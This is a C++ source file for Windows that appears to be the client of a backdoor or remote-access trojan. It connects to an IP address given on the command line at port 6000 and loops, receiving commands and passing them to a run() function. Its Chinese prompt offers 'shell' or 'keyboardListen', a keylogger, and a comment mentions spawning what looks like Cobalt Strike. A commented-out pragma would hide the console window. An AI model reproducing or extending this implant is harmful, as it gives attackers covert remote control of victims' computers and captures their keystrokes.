//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#include <winsock2.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <iostream>
#include "choice.h"
#include "baseFunction.h"
#include "run.h"
#pragma comment(lib,"ws2_32.lib")
#define MSG_LEN 10244



int main(int argc, char **argv) {
	int err;
	int result;
	int i = 0;
	char cmdLine[MSG_LEN] = { 0 };
	char message[MSG_LEN] = { 0 };
	DWORD getLength;
	SOCKET sockServer;
	SOCKET sockClient;
	SOCKADDR_IN addrServer;
	SOCKADDR_IN addrClient;
	WSADATA wsData;
	WORD wVersionRequested;
	const char welcome[] = "请输入shell或keyboardListen";
	unsigned netAddr[100];

	//HANDLE hRead, hWrite;



	wVersionRequested = MAKEWORD(2, 2);
	err = WSAStartup(wVersionRequested, &wsData);
	if (err != 0) {
		return 1;
	}
	if (LOBYTE(wsData.wVersion) != 2 || HIBYTE(wsData.wVersion) != 2) {
		WSACleanup();
		return 1;
	}
	sockServer = socket(AF_INET, SOCK_STREAM, 0);
	sockClient = socket(AF_INET, SOCK_STREAM, 0);
	inet_pton(AF_INET, argv[1], &addrServer.sin_addr);
	//addrServer.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(6000);
	connect(sockClient, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));

	while (1) {
		ZeroMemory(cmdLine, MSG_LEN);
		recv(sockClient, cmdLine, MSG_LEN, 0);
		str_Replace(cmdLine, '\n', ' ');
		run(cmdLine, message,sockClient);     //执行何种选择:shell?SpawnCS?.......
		ZeroMemory(message, MSG_LEN);
	}
	closesocket(sockClient);
	WSACleanup();

	getchar();
	return 0;
}